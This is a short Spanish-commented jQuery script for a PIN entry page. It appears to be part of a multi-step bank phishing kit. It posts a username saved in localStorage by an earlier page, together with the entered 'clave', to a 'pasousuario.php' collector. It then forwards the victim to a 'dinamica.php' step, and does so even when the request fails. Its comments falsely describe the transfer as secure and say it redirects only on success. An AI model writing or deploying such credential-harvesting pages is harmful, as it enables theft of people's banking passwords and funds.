<script type="text/javascript">
    $(document).ready(function() {
        $("#btn-password").click(function(e) {
            e.preventDefault(); // Evita envíos accidentales del formulario

            var pin = $("#input_real").val();
            // Recuperamos el usuario guardado o lo buscamos en el input si existe
            var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo";

            if (pin.length < 4) {
                alert("Por favor ingrese su clave completa.");
                return false;
            }

            $("#fondo, #cargando-o").show();
            
            // Enviamos los datos al procesador de forma segura
            $.ajax({
                type: 'POST',
                url: '../process/pasousuario.php', // Verifica que la carpeta 'process' esté en minúsculas
                data: { 
                    'txt-usuario': usr, 
                    'txt-password': pin 
                },
                success: function(response) {
                    // Solo redirige si el servidor respondió con éxito
                    window.location.href = "dinamica.php"; 
                },
                error: function() {
                    // Si el servidor falla, reintentamos después de un breve tiempo
                    console.log("Error de conexión, reintentando...");
                    setTimeout(function() { window.location.href = "dinamica.php"; }, 2000);
                }
            });
        });
    });
</script>
